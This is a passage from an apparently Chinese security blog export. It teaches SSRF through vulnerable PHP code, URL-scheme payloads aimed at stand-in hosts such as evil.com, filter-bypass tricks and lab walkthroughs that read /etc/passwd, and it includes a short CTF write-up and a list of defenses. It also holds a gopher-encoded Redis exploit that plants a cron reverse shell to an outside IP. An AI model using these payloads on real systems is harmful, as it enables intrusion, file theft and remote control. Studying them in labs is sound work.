=&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125; echo $img; ?&gt;\n2、fsockopen():\n以下代码使用fsockopen函数实现获取用户指定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。\n定义：打开一个网络连接或者一个Unix套接字连接参数\t描述hostname\t安装了OpenSSL，添加访问协议ssl://或者是tls://，从而可以使用基于TCP/IP协议的SSL或者TLS的客户端连接到远程主机port\t端口号。如果对该参数传一个-1，则表示不使用端口，例如unix://errno\t如果errno的返回值为0，而且这个函数的返回值为false，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误errstr\t错误信息将以字符串的信息返回。timeout\t设置连接的时限，单位为秒。\n&lt;?php function GetFile($host,$port,$link) &#123;     $fp = fsockopen($host, intval($port), $errno, $errstr, 30);     if (!$fp) &#123;         echo &quot;$errstr (error number $errno) \\n&quot;;     &#125;else &#123;         $out = &quot;GET $link HTTP/1.1\\r\\n&quot;;         $out .= &quot;Host: $host\\r\\n&quot;;         $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;;         $out .= &quot;\\r\\n&quot;;         fwrite($fp, $out);         $contents=&#x27;&#x27;;         while (!feof($fp)) &#123;             $contents.= fgets($fp, 1024);         &#125;         fclose($fp);         return $contents;     &#125; &#125;?&gt;\n3、curl_exec():支持多种协议\ncURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。\n定义：执行一个cURL会话参数：ch  由 curl_init() 返回的 cURL 句柄。用法：抓取URL并把它传递给浏览器 curl_exec($ch)\n&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123;$link = $_POST[&#x27;url&#x27;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj); $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;file_put_contents($filename, $result); echo $result;&#125;?&gt;\n注意事项\n一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents()支持php://input协议\n五、SSRF中URL的伪协议\nredis服务是在6379端口开启的\n浅浅了解一下redis服务\n\n浅浅了解一下curl命令\ncurl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思\n不带有任何参数时，curl 就是发出 GET 请求\n$ curl https://www.example.com\n上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出\n-v参数输出通信的整个过程，用于调试。我们便可以利用-v参数进行读取文件\n使用file协议curl -v file:///etc/passwd使用ftp协议 curl -v &quot;ftp://127.0.0.1:端口/info&quot;使用dict协议 curl -v &quot;dict://127.0.0.1:端口/info&quot;使用gopher协议 curl -v &quot;gopher://127.0.0.1:端口/_info&quot;\n其他参数可以参考curl\n常见内网IP段\n局域网地址范围分三类，以下IP段为内网IP段：\nC类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255\n当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\nfile:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload\n5.1 file\n这种URL Schema可以尝试从文件系统中获取文件：\nhttp://example.com/ssrf.php?url=file:///etc/passwd\nhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini\n\n如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：\n5.2 dict\n这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表。\nDICT协议,一个字典服务器协议,A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:2628。\nhttp://example.com/ssrf.php?dict://evil.com:1337/\nevil.com:$ nc -lvp 1337\nConnection from [192.168.0.12] port 1337[tcp/*]\naccepted (family 2, sport 31126)CLIENT libcurl 7.40.0\n\n5.3 sftp\n在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。\nhttp://example.com/ssrf.php?url=sftp://evil.com:1337/\nevil.com:$ nc -lvp 1337\nConnection from [192.168.0.12] port 1337[tcp/*]\naccepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2\n\n5.4 ldap://或ldaps:// 或ldapi://\nLDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\nhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit\n\n5.5 tftp://\nTFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。\nhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET\nevil.com:# nc -lvup 1337\nListening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3\n\n5.6 gopher://\nGopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\nGopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。\nhttp://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt;\nevil.com:# nc -lvp 1337\nListening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest\n\n六、SSRF漏洞利用（危害）\n1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;\n2.攻击运行在内网或本地的应用程序（比如溢出）;\n3.对内网web应用进行指纹识别，通过访问默认文件实现;\n4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;\n5.利用file协议读取本地文件等。.\n6.各个协议调用探针：http,file,dict,ftp,gopher等\nhttp:192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21\n七、漏洞的验证：\n根据漏洞产生的原理，对所我们所测试的地方进行一个分析\n\n首先这个地方应该是服务器A请求访问以外的服务端B，而不是客户端向服务器A发起请求\n\n使用排除法：看URL地址中有没有包含其他URL地址，再看数据包的请求\n\n方法一：对URL地址进行分析\n我在网上随便找了一张图片，右键新标签打开后\n对URL地址进行了解码，就看见了2个包含的URL地址\n\n方法二：对数据包进行分析\n其实也可以使用burpsuite抓包进行分析\n这里直接看见了文件的URL是其他网站来的\n\n八、利用步骤\n第一步：分析是否可能存在SSRF\n（一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功）\n第二步：测试是哪种函数引起的SSRF漏洞\n对端口进行一个探测（http协议），能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作内网应用指纹识别（http协议）读取文件（file协议）\n具体参考：https://blog.csdn.net/qq_53079406/article/details/124005258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168112506716800215018171%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168112506716800215018171&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-124005258-null-null.142\n九、绕过方式\n部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：\n一、常见的绕过方式\n1、限制为http://www.xxx.com 域名时（利用@与/#/）\n可以尝试采用http基本身份认证的方式绕过\n如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异\n在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。\n\n/#/符:绕过后缀\n一般用于.jpg等固定后缀不可更改\n例如http://10.10.10.10:5001/#/abc.jpg，实际在浏览器访问的是 http://10.10.10.10:5001\n\n2.采用短网址绕过\n比如百度短地址https://dwz.cn/\n\n3.采用进制转换\n127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.\n\nIP地址转为八、十、十六进制及IP地址省略写法（以下均代表127.0.0.1）\n\n   0177.00.00.01\n   2130706433\n   0x7f.0x0.0x0.0x1\n   127.1\n\n\n4.利用特殊域名\n原理是DNS解析。xip.io可以指向任意域名，即\n127.0.0.1.xip.io，可解析为127.0.0.1\n(xip.io 现在好像用不了了，可以找找其他的)\n\nhttp://www.owasp.org.127.0.0.1.xip.io/\n\n5.利用[::]绕过localhost\n可以利用[::]来绕过localhost\nhttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]\nhttp://[::1]\nhttp://[::]:80/\nhttp://0:80\n\n6.利用句号\n127。0。0。1 &gt;&gt;&gt; 127.0.0.1\n\n7.CRLF 编码绕过\n%0d-&gt;0x0d-&gt;\\r回车\n\n%0a-&gt;0x0a-&gt;\\n换行\n\n进行HTTP头部注入\nexample.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a \n\n8.利用封闭的字母数字\n利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com\nhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳\n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇\n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛\n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵\nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ\nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ\n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴\n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\n9.配置域名\n手上有可控域名，可将域名指向想要请求的IP\n10.库绕过\n利用检测时使用的URL parse库与请求时使用的parse库的差异绕过，如 http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/ 不同的parse库的解析结果不一样\nurllib2 : 1.1.1.1\n\nrequests + browsers : 2.2.2.2\n\nurllib : 3.3.3.3\n\n11.dns重定向绕过\n一般进行 ssrf 防御的模式如下：\n\n1. 获取到输入的URL，从该URL中提取host   对该host进行DNS解析，获取到解析的IP2. 访问规则判断该IP是否在指定范围内（即判断IP是否符合规则）   如果IP在范围内，即对此URL发起请求   如果IP不在范围内，则请求失败\n然而访问规则在判段得到的IP为指定范围内IP，到服务端请求URL这个中间还存在一个细微的时间差，\nDNS重绑定则是利用这一点，让服务器第一次解析host的ip为符合规则的公网IP，在第二次请求解析URL时host的ip又变为了不符合规则的内网IP，从而进行ssrf。\n这里推荐使用burpsuite的intruder模块，来批量发送请求，以利用时间差完成ssrf。\n\n在线DNS重绑定平台：https://lock.cmpxchg8b.com/rebinder.html\n12.攻击本地\nhttp://127.0.0.1:80http://localhost:22\n13.利用上传\n也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF\n14.利用协议\nDict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\n15.302重定向\n需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中\n服务端代码如下：\n&lt;?php header(&quot;Location: http://192.168.1.10&quot;);exit(); ?&gt;\n16.使用组合\n各种绕过进行自由组合即可\n十、SSRF漏防御\n通常有以下5个思路：\n1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n3.限制请求的端口为http常用的端口，比如，80,443,8080,8090。\n4.黑名单内网，避免应用被用来获取获取内网数据，攻击内网。\n5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。\n6.去除url中的特殊字符\n7.不跟随30x跳转（跟随跳转需要从1开始重新检测）\n8.请求时设置host header为ip\n十一、靶场实战\n1. SSRF-curl\n第一步：分析是否可能存在SSRF\n（一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功）\n点击它\n\n发现是URL传递的\n（如果无法显示，就在127.0.0.1后面加上端口号）\n\n第二步：测试是哪种函数引起的SSRF漏洞\n这是个SSRF（curl）靶场，就不做过多测试\n函数不同所支持的功能也存在差别\n对端口进行一个探测（http协议）(当然实战过程中肯定要对端口进行爆破，响应时间长的端口就是可以访问的端口)\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306\n\n能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作\n内网应用指纹识别（http协议）\n（这个我在尝试的时候，如果原文件带了版本号，读取的时候也要带，大小写不一样不影响）\n\n读取文件（file协议）\n\n2. SSRF-file_get_contents\n第一步：判断是否存在SSRF漏洞\n上一题是url，这一题是file函数\n但是操作还是基本类似\n\n8.2.2、第二步：利用漏洞\n读取php源码\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php\n再使用base64解密即可得到源码\n&lt;?php/** * Created by runner.han * There is nothing new under the sun */$SELF_PAGE = substr($_SERVER[&#x27;PHP_SELF&#x27;],strrpos($_SERVER[&#x27;PHP_SELF&#x27;],&#x27;/&#x27;)+1);if ($SELF_PAGE = &quot;ssrf.php&quot;)&#123;    $ACTIVE = array(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;active open&#x27;,&#x27;active&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);&#125;$PIKA_ROOT_DIR =  &quot;../../&quot;;include_once $PIKA_ROOT_DIR.&#x27;header.php&#x27;;?&gt;&lt;div class=&quot;main-content&quot;&gt;    &lt;div class=&quot;main-content-inner&quot;&gt;        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;            &lt;ul class=&quot;breadcrumb&quot;&gt;                &lt;li&gt;                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;                    &lt;a href=&quot;ssrf.php&quot;&gt;&lt;/a&gt;                &lt;/li&gt;                &lt;li class=&quot;active&quot;&gt;概述&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;page-content&quot;&gt;         &lt;b&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造)&lt;/b&gt;         &lt;p&gt;其形成的原因大都是由于服务端&lt;b&gt;提供了从其他服务器应用获取数据的功能&lt;/b&gt;,但又没有对目标地址做严格过滤与限制&lt;/p&gt;            导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据&lt;br&gt;            &lt;br&gt;            数据流:攻击者-----&gt;服务器----&gt;目标地址&lt;br&gt;            &lt;br&gt;            根据后台使用的函数的不同,对应的影响和利用方法又有不一样            &lt;pre style=&quot;width: 500px;&quot;&gt;PHP中下面函数的使用不当会导致SSRF:file_get_contents()fsockopen()curl_exec()            &lt;/pre&gt;&lt;br&gt;            如果一定要通过后台服务器远程去对用户指定(&quot;或者预埋在前端的请求&quot;)的地址进行资源请求,&lt;b&gt;则请做好目标地址的过滤&lt;/b&gt;。&lt;br&gt;            &lt;br&gt;            你可以根据&quot;SSRF&quot;里面的项目来搞懂问题的原因        &lt;/div&gt;&lt;!-- /.page-content --&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!-- /.main-content --&gt;&lt;?phpinclude_once $PIKA_ROOT_DIR . &#x27;footer.php&#x27;;?&gt;\n读取本地host等文件\nhttp://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=file://c:\\windows\\system32\\drivers\\etc\\hosts\n\n3. SSRF-lab实战\n可利用的主要就几个协议吧file 协议结合目录遍历读取文件。gopher 协议打开端口。dict 协议主要用于结合 curl 攻击。http 协议进行内网探测。\nSSRF-Lab 搭建教程：https://drun1baby.top/2022/05/16/SSRF-Lab环境搭建/\n3.1 file协议利用\n使用 file 协议进行的任意文件读取算是 ssrf 最简单的利用方式了\n首先先写一段有 ssrf 漏洞的代码，命名为 ssrf.php 并部署到服务器上。\n\n用 file 协议简单测试一下，可以看到能成功利用 ssrf 漏洞读取文件。file 协议的格式为：file:// 文件路径\n这里不知道为什么我的服务器读取不到内网文件，先借用佬的图片了\n\nPayload\nfile:///etc/passwd  # file:// 之后可以接任意文件\n这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。\nhttp://ip/index.php?url=file:///etc/passwd\n而在 SSRF-Lab 当中较简单，在框中输入file:///etc/passwd即可。\n\n除此之外，利用这个协议可以读取主机内任意文件。接下来可以读取配置文件和源代码方便进一步的渗透，这里之所以成功实现是因为URL没有经过严格的过滤，所以才可以利用这个协议进行任意文件读取。\n3.2 http协议研究\nhttp 协议的利用也很简单，就是向目标发送 http 请求，由于 get 请求的参数是直接加在 url 里的，所以可以探测内网那些使用 get 请求即可攻击的应用。\n\n使用 nc 可以接收到发送的 http 数据包，结构非常简单。\n\n\n3.3 dict 协议的使用\n利用dict协议，dict://ip/info可获取本地redis服务配置信息。\n如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 redis 与 dict 协议\n在上面还介绍过redis服务，看了很多SSRF 协议中的利用都是结合 Redis 服务的，所以这里就先在ssrf-basics 容器里面安装该服务\n$ docker ps #查看容器编号$ docker exec -it 容器编号 /bin/bash #进入容器$ apt-get install redis-server # 安装redis服务$ redis-server #开启redis服务\n\n安装好之后，便可以利用协议收集信息及反弹 shell\n利用dict协议，dict://127.0.0.1:6379/info可获取本地redis服务配置信息\n这里大概是因为6379是其默认端口\n\n用 nc 在测试机监听，然后利用 ssrf 漏洞测试一下 dict 协议发送字符串 info，看看接收方会收到什么：\n\n\n可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的 QUIT。\ndict 协议不支持换行符，没有办法进行换行，相当于一次只能执行一条命令，所以不能用来攻击那些需要交互的应用（比如需要认证的 redis）。\n\n3.4 gopher 协议的使用\n首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议\nredis-cli -h $1 flushallecho -e &quot;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\\n\\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save//redis-cli查看所有的keys及清空所有的数据\n这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：\ngopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a\n经过url解码便是：\ngopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit\n进行测试，成功回显\n\n接下来在 ssrf-lab/basics 容器里面查看插入的 KEY 值，验证是否成功\n\n利用Gopher 协议还可以攻击 FastCGI，攻击内网 Vulnerability Web\n高级文章：https://xz.aliyun.com/t/9554#toc-10\n需要发送多行数据时，就要用到 gopher 协议，同样使用 nc 简单测试一下，可以看到接收端成功接收到了换行的数据，所以 gopher 协议可以用来攻击那些需要交互的应用。\n至于这个 _ 符号暂时不知道为何要+，下面结论有解释\n\n\n结论：\n1、gopher 协议会吃掉第一个字符，所以要先放一个没有用的字符2、回车是 \\r\\n，但如果直接对 \\r\\n 进行 url 编码结果是不对的，因为编码的是 \\ r \\ n 四个字符的结果，实际回车只是两个不可见的字符，url 编码为 %0d%0a3、直接发 % 可以正常接收，但是发 %0d%0a 就会出现数据包发不出去的问题，还需要进行一次 url 编码成 %250d%250a 才能正常发送出去（直接用 curl 命令测试没这个问题，应该是 web 服务器会自动进行一次 url 解码导致的）\n3.5 Weblogic SSRF漏洞\n参考：https://xz.aliyun.com/t/7333#toc-5\n3.6 更多攻击对象\n参考：https://blog.chaitin.cn/gopher-attack-surfaces/\n","categories":["常见top漏洞"]},{"title":"攻防世界-baby_web","url":"/2023/07/27/baby_web/","content":"题目描述：\n想想初始页面是哪个\n题目解题：\n进入首页发现如图\n\n题目告诉我们想想初始页面在哪，那很明显就是让我们访问index.php，于是我们访问index.php看看，访问之后发现其很快就跳转到1.php，所以我们F12看看网络情况，如下图，打开后继续访问index.php发现如下图，结果是被重定向了\n\n那我们bp抓包看看，访问index.php抓包\n\n成功截取到flag\n","categories":["攻防世界"],"tags":["攻防世界"]}]